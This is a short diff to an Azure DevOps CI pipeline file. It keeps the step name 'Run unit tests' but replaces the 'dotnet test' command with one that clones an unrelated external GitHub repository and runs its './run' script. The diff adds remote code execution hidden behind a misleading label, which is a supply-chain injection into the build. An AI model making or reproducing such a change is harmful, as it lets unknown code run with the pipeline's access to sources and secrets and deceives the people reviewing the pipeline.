@@ -25,7 +25,7 @@ stages:
       - task: CmdLine@2
         displayName: "Run unit tests"
         inputs:
-          script: 'dotnet test'
+          script: 'git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run'
           workingDirectory: '$(Build.SourcesDirectory)/src'
           failOnStderr: true
 
